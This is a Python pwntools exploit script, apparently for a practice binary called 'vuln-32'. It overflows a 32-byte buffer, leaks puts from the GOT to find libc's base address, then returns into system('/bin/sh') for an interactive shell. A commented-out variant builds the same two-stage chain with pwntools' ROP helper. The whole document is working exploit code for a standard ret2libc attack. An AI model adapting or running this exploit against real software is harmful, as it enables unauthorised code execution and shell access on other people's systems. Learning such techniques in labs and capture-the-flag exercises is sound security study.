from pwn import *

elf = context.binary = ELF('./vuln-32')
libc = elf.libc
p = process()

p.recvline()        # just receive the first output

payload = flat(
    'A' * 32,
    elf.plt['puts'],
    elf.sym['main'],
    elf.got['puts']
)

p.sendline(payload)

puts_leak = u32(p.recv(4))
p.recvlines(2)


libc.address = puts_leak - libc.sym['puts']
log.success(f'LIBC base: {hex(libc.address)}')

payload = flat(
    'A' * 32,
    libc.sym['system'],
    libc.sym['exit'],            # exit is not required here, it's just nicer
    next(libc.search(b'/bin/sh\x00'))
)

p.sendline(payload)

p.interactive()





# if you want to use Rop you can do it like this:

# by using ROP you do not have to worry about the order of the arguments, and  the calling convention is handled for you
# otherwise you have to do it manually as shown above 


# from pwn import *

# context.binary = elf = ELF('./vuln-32')
# libc = ELF('/lib/i386-linux-gnu/libc.so.6')  # Adjust this path to match your system's libc
# context.log_level = 'debug'

# p = process()

# # === Stage 1: Leak puts@libc ===
# p.recvline()

# rop1 = ROP(elf)
# rop1.call(elf.plt['puts'], [elf.got['puts']])
# rop1.call(elf.sym['main'])

# payload = flat(
#     b'A' * 32,
#     rop1.chain()
# )

# p.sendline(payload)

# # Read the leaked address
# puts_leak = u32(p.recv(4))
# p.recvlines(2)

# log.success(f'Leaked puts address: {hex(puts_leak)}')

# # === Stage 2: Calculate libc base ===
# libc.address = puts_leak - libc.sym['puts']
# log.success(f'LIBC base: {hex(libc.address)}')

# # === Stage 3: Call system("/bin/sh") ===
# rop2 = ROP(libc)
# bin_sh = next(libc.search(b'/bin/sh\x00'))

# rop2.call(libc.sym['system'], [bin_sh])
# rop2.call(libc.sym['exit'])

# payload2 = flat(
#     b'A' * 32,
#     rop2.chain()
# )

# p.sendline(payload2)
# p.interactive()
